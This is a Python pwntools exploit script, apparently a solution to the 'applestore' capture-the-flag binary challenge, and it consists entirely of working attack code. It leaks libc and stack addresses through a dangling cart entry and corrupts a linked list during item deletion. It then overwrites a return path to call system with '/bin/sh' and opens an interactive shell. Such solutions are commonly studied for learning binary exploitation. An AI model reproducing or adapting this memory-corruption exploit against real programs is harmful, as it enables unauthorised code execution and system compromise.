from pwn import *

def add (num):
    r.recvuntil(b'> ')
    r.sendline(str(2))
    r.recvuntil(b'Number> ')
    r.sendline(str(num))

def checkout ():
    r.recvuntil(b'> ')
    r.sendline(str(5))
    r.recvuntil('(y/n) > ')
    r.sendline('y')

def cart (payload):
    r.recvuntil('> ')
    r.sendline('4')
    r.recvuntil('(y/n) > ')
    r.sendline(payload)

def dels (index):
    r.recvuntil(b'> ')
    r.sendline(str(3))
    r.recvuntil('Item Number> ')
    r.sendline(index)

r = process('./applestore')

for i in range (6):
    add(1)
for i in range (20):
    add(2)

# Leak libc base
checkout()
cart(b'y\x00' + p32(0x804b028) + b'\0' * 0xc)
r.recvuntil('27: ')
libc = u32(r.recv(4)) - 0x67b40
system = libc + 0x3d200
environ = libc + 0x1d9dd8
success('libc base -> %s' % hex(libc))
success('system address -> %s' % hex(system))
success('environ address -> %s' % hex(environ))

cart(b'y\x00' + p32(environ) + b'\0' * 0xc)
r.recvuntil('27: ')
stack = u32(r.recv(4))
#success('handler ebp -> %s' % hex(handler_stack))
del_stack = stack - 0x104
success('del ebp -> %s' % hex(del_stack))

pause()
payload = b'27' + p32(0) + p32(0) + p32(0x804b040 + 0x22) + p32(del_stack-0x8)
dels(payload)
r.sendlineafter(b'> ', p32(system) + b'||/bin/sh')

r.interactive()
